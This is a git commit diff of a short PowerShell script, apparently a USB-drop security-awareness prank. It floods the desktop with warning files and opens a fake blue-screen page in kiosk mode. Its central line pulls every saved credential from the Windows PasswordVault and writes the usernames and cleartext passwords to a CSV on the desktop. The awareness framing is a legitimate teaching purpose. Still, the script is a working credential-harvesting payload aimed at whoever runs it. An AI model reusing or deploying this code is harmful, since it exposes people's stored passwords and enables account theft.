d5abdf6b3846dbee4ed84ecade9a98d29bc2f973
ThomasNordlund1976 <96356419+ThomasNordlund1976@users.noreply.github.com>
2021-12-19 11:02:45 +0100

    Update ubs.ps1

--- ubs.ps1
+++ ubs.ps1
@@ -1,4 +1,5 @@
 ﻿foreach ($i in 1..200){
-        new-item "$env:HOMEDRIVE$env:HOMEPATH\desktop\I_should_not_use_unknown_USBs-$i.txt" -ItemType File -Force -Value "DONT BE A SECURITYRISK!`r`n"  
+        new-item "$env:HOMEDRIVE$env:HOMEPATH\desktop\I_should_not_use_unknown_USBs-$i.txt" -ItemType File -Force -Value "DONT BE A SECURITYRISK $($env:username)!"  
 } 
-[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$($($(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }) | select resource,username,password | ConvertTo-Csv | out-file "$env:HOMEDRIVE$env:HOMEPATH\desktop\This-Could-have-Been-stolen.csv")
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$($($(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }) | select resource,username,password | ConvertTo-Csv -NoTypeInformation -Delimiter ','| out-file "$env:HOMEDRIVE$env:HOMEPATH\desktop\This-Could-have-Been-stolen.csv" -Encoding utf8)
+Start-Process iexplore.exe -ArgumentList "-k http://fakebsod.com/windows-8-and-10" -
